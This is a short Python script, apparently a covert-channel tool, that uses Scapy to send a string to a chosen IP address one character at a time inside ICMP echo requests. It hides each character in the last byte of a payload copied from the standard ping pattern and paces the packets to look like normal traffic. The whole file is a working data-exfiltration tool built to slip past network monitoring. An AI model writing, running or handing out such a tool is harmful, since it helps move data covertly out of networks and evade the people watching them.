import sys
import random
import time
from scapy.all import IP, ICMP, send

def send_modified_ping(ip, char, seq_num, packet_id):
    payload = bytearray([0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68,
                         0x69, 0x6a, 0x6b, 0x6c, 0x6d, 0x6e, 0x6f, 0x70,
                         0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x61,
                         0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69])  # Custom payload
    
    payload[-1] = ord(char)  # Modify the least significant byte with the ASCII value of the character
    
    packet = IP(dst=ip, id=packet_id, ttl=64) / ICMP(type=8, code=0, id=packet_id, seq=seq_num) / payload
    send(packet)

def main():
    if len(sys.argv) != 3:
        print("Usage: python script.py <ip> <string>")
        return
    
    ip = sys.argv[1]
    string = sys.argv[2]
    
    packet_id = 1
    seq_num = 100 + 10 * random.randint(0, 9)  # Starting seq number with some randomness
    
    for char in string:
        send_modified_ping(ip, char, seq_num, packet_id)
        print(f"Sent modified ping with character: {char}")
        
        packet_id += 1
        seq_num += 1
        time.sleep(1)  # Add a delay to simulate realistic timing
        
if __name__ == "__main__":
    main()
